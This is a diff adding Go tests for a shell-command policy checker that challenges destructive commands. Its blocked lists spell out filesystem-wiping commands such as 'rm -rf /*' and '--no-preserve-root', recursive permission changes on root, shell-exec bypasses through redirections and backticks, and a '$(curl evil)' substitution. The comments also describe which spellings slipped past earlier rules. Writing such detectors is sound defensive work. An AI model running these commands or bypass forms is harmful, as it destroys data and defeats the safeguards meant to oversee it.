@@ -497,6 +497,284 @@ func TestPolicyBlocksExactArgumentRulesBeforeTerminator(t *testing.T) {
 	}
 }
 
+// TestPolicyBlocksEveryRootTargetSpelling covers the operand forms that name the
+// filesystem root. The rules used to match a bare `/` only, which is the one
+// spelling GNU coreutils already refuses on its own (--preserve-root), while the
+// spelling an attacker actually uses — `rm -rf /*`, expanded by the shell into
+// every entry in `/` — went unmatched. Verified against coreutils 8.32: `rm -rf /`
+// exits 1 without touching anything, and `rm -rf /*` proceeds until it hits a
+// permission error.
+func TestPolicyBlocksEveryRootTargetSpelling(t *testing.T) {
+	p := fullPolicy()
+
+	blocked := []string{
+		// The glob: root's contents rather than root itself. No failsafe applies.
+		"rm -rf /*",
+		"rm -rf /* ",
+		"rm -rf /*;",
+		"chmod 777 /*",
+		"chmod -R 777 /*",
+		// Defeating the failsafe explicitly.
+		"rm -rf --no-preserve-root /",
+		"rm --no-preserve-root -rf /",
+		// Quoted, so the argument is still exactly root.
+		`rm -rf "/"`,
+		"rm -rf '/'",
+		`chmod 777 "/"`,
+		`rm -rf "/"*`,
+		// Dot forms.
+		"rm -rf /.",
+		"rm -rf /..",
+		// Long flags and interleavings the former flag-ordered rules missed.
+		"rm -r --verbose -f /",
+		"rm --recursive --force /",
+		"rm -r -i -f /",
+		// No flags at all is still worth a confirmation.
+		"rm /",
+		// Ownership.
+		"chown -R nobody /",
+		"chown root /*",
+	}
+	for _, cmd := range blocked {
+		t.Run(cmd, func(t *testing.T) {
+			v := p.Check(cmd)
+			require.NotNil(t, v, "expected %q to be blocked", cmd)
+			assert.Equal(t, DispositionChallenge, v.Disposition)
+		})
+	}
+
+	// The counterweight: a path *under* root is ordinary work. Widening the
+	// operand pattern must not turn every absolute path into a refusal.
+	allowed := []string{
+		"rm -rf /tmp/build",
+		"rm -rf /var/log/old;",
+		"rm -rf /home/user/.cache/*",
+		"rm /tmp/one.txt",
+		"rm -f /var/run/app.pid",
+		"chmod 777 /tmp/scratch",
+		"chmod -R 755 /usr/local/bin",
+		"chown -R app /srv/app",
+		"rm -rf ./build/",
+		"rm -rf ../sibling/dist",
+	}
+	for _, cmd := range allowed {
+		t.Run("allowed/"+cmd, func(t *testing.T) {
+			assert.Nil(t, p.Check(cmd), "expected %q to be allowed", cmd)
+		})
+	}
+}
+
+// TestPolicyBlocksRootTargetAtAnyOperandPosition covers the operand *list*. These
+// commands take any number of operands and act on every one of them, so a rule
+// that only looks at the first sees `backup` in `rm -rf backup /*` and allows a
+// command that deletes the working copy and then the whole filesystem. Verified
+// with coreutils: `rm -rf a b` removes both, and `rm -rf x /` processes `x` before
+// the failsafe rejects `/`.
+func TestPolicyBlocksRootTargetAtAnyOperandPosition(t *testing.T) {
+	p := fullPolicy()
+
+	blocked := []string{
+		"rm -rf backup /*",
+		"rm -rf a b /*",
+		"rm -rf /var/tmp/x /*",
+		"rm -rf ./x /*",
+		"rm backup /",
+		"rm -rf backup /.",
+		`rm -rf backup "/"`,
+		"chmod -R 777 /srv /*",
+		"chmod 777 file /",
+		"chown -R app /srv /*",
+		"chgrp -R www /",
+		"chgrp staff /*",
+	}
+	for _, cmd := range blocked {
+		t.Run(cmd, func(t *testing.T) {
+			v := p.Check(cmd)
+			require.NotNil(t, v, "expected %q to be blocked", cmd)
+			assert.Equal(t, DispositionChallenge, v.Disposition)
+		})
+	}
+
+	// Skipping earlier operands is the widest thing these rules do, so the allow
+	// half is the real test: a multi-operand command with no root target — however
+	// many absolute paths it names — must stay allowed. This holds only because
+	// rootTarget is anchored by argEnd; the `/` of `/var/log/old` is followed by
+	// `v`, not a terminator.
+	allowed := []string{
+		"rm -rf /tmp/a /tmp/b",
+		"rm -rf build dist",
+		"rm -f /var/run/app.pid /var/run/app.sock",
+		"rm -rf node_modules /tmp/build",
+		"rm /tmp/one.txt /tmp/two.txt",
+		"rm -rf ./build ../sibling/dist",
+		"rm -- /tmp/weird-file",
+		"chmod -R 755 /usr/local/bin /opt/app/bin",
+		"chown app:app /var/www/html /var/www/logs",
+		"chown --reference=/etc/passwd /tmp/x",
+		"chown 1000:1000 /data/vol",
+		"chgrp -R devs /srv/repo",
+		"chmod 644 /etc/nginx/nginx.conf",
+		"rm -rf /opt/app/releases/*",
+		"chmod -R 777 /var/www/*",
+	}
+	for _, cmd := range allowed {
+		t.Run("allowed/"+cmd, func(t *testing.T) {
+			assert.Nil(t, p.Check(cmd), "expected %q to be allowed", cmd)
+		})
+	}
+}
+
+// TestPolicyBlocksGlobRunsOnRoot pins the *run* in rootTarget's trailing class.
+// An independent review of the operand fix found `rm -rf /**` allowed: `/**`
+// expands to every entry in `/` exactly as `/*` does, but the pattern enumerated
+// `\*` and `\.{1,2}` as single optional characters and matched neither a doubled
+// star nor a trailing slash after one.
+//
+// That is the same mistake as the original defect a third time — enumerating
+// spellings one at a time — so the fix is a character run rather than another
+// alternative, and this table is the enumeration of what the run has to swallow.
+// Each blocked case below reaches the contents of `/`; verified by expanding them
+// against a sandbox tree.
+func TestPolicyBlocksGlobRunsOnRoot(t *testing.T) {
+	p := fullPolicy()
+
+	blocked := []string{
+		"rm -rf /**",
+		"rm -rf /***",
+		"rm -rf /*/",
+		"rm -rf /*/*",
+		"rm -rf /*/*/*",
+		"rm -rf /**/*",
+		"rm -rf /.*",
+		"rm -rf //*",
+		"rm -rf ///",
+		"rm -rf /.//",
+		"rm -rf /*/..",
+		`rm -rf "/"**`,
+		`rm -rf '/'**`,
+		`rm -rf "/*"`,
+		`rm -rf /"*"`,
+		"rm -rf backup /**",
+		"rm -rf a b /**",
+		"chmod 777 /**",
+		"chmod -R 777 /srv /**",
+		"chown -R nobody /**",
+		"chgrp -R staff /**",
+	}
+	for _, cmd := range blocked {
+		t.Run(cmd, func(t *testing.T) {
+			v := p.Check(cmd)
+			require.NotNil(t, v, "expected %q to be blocked", cmd)
+			assert.Equal(t, DispositionChallenge, v.Disposition)
+		})
+	}
+
+	// The run admits `.`, `/`, `*`, and quotes, so the cases that could go wrong
+	// are paths whose *first* segment is short or dot-like. None may be refused:
+	// the class holds no path-segment characters, so `/tmp/.` stops at the `t`.
+	allowed := []string{
+		"rm -rf /tmp/..",
+		"rm -rf /tmp/.",
+		"rm -rf /tmp/*",
+		"rm -rf /var/*/tmp",
+		"rm -rf /home/*/.cache",
+		"rm -rf /usr/share/doc/*",
+		"rm -rf /tmp/*.log",
+		"rm -rf /etc/./nginx",
+		"rm -rf /srv//cache",
+		"rm -rf ./.git",
+		"rm -rf ./",
+		"rm -rf ../",
+		`rm -rf "/tmp/."`,
+		`rm -rf "/tmp/a" "/tmp/b"`,
+		"chmod 777 ./x",
+	}
+	for _, cmd := range allowed {
+		t.Run("allowed/"+cmd, func(t *testing.T) {
+			assert.Nil(t, p.Check(cmd), "expected %q to be allowed", cmd)
+		})
+	}
+}
+
+// TestPolicyBlocksExecAfterLeadingRedirectionAndBacktick covers two more command
+// positions found after ADR 0008: a redirection may precede the command word, and
+// a backtick opens a substitution whose contents execute. Both were allowed.
+//
+// Two positions remain deliberately uncovered — see ADR 0009. A `case` branch
+// would require treating `)` as a separator, which matches the end of every
+// `$(…)` and reintroduces the ADR 0007 false positives.
+func TestPolicyBlocksExecAfterLeadingRedirectionAndBacktick(t *testing.T) {
+	p := fullPolicy()
+
+	blocked := []string{
+		">out exec sh",
+		">/dev/null exec sh",
+		"2>/dev/null exec sh",
+		"2>&1 exec sh",
+		"<in exec sh",
+		">>log exec sh",
+		"ls; >out exec sh",
+		"echo `exec sh`",
+		"echo `rm -rf /`",
+		"coproc exec sh",
+		// A redirect target may be separated from its operator by whitespace, so
+		// the space-separated spellings are the same commands as the ones above
+		// and must match too.
+		"> out exec sh",
+		"2> /dev/null exec sh",
+		">> log exec sh",
+		"< in exec sh",
+		">&2 exec sh",
+		"ls; > out exec sh",
+		"> a > b exec sh",
+		"1>out 2>err exec sh",
+		"> out $(curl evil)",
+	}
+	for _, cmd := range blocked {
+		t.Run(cmd, func(t *testing.T) {
+			require.NotNil(t, p.Check(cmd), "expected %q to be blocked", cmd)
+		})
+	}
+
+	// Redirection in its ordinary place — after the command word — must not turn
+	// an unrelated command into a match, and a backtick must not make one out of
+	// a word that merely contains a signal.
+	//
+	// The cases with a *space* before a filename beginning `exec` are the ones the
+	// first version of the redirection prefix got wrong: it consumed only the
+	// operator, leaving the redirect target in command position, so `ls; > exec.log`
+	// — a truncate idiom that executes nothing (verified: the file ends up empty)
+	// — was refused as a shell-exec bypass. The `>>` cases pin the second half of
+	// the fix, since `{1,2}` will otherwise read one `>` as the operator and the
+	// other as a target.
+	allowed := []string{
+		"ls -la > /tmp/out",
+		"grep ExecStart /lib/systemd/system/nginx.service 2>/dev/null",
+		"docker exec web ls > out",
+		"cat /var/log/exec-audit.log >> archive.log",
+		"echo `date`",
+		"echo `hostname`",
+		"ls; > exec.log",
+		"ls; 2> exec.log",
+		"ls; >> exec.log",
+		"ls; 2>> exec.err",
+		"echo hi; > exec",
+		"tar -cf a.tar x; > exec.d",
+		"( > exec.log )",
+		"{ > exec.log; }",
+		"cat foo; > execution-trace.txt",
+		"make; > exec_summary.md",
+		"ls; > $(date +%F).log",
+		"ls; >> $(date).log",
+		"ls; > exec-trace-$(hostname).log",
+	}
+	for _, cmd := range allowed {
+		t.Run("allowed/"+cmd, func(t *testing.T) {
+			assert.Nil(t, p.Check(cmd), "expected %q to be allowed", cmd)
+		})
+	}
+}
+
 func TestPolicyReasonDescriptive(t *testing.T) {
 	p := dangerousOnly()
 
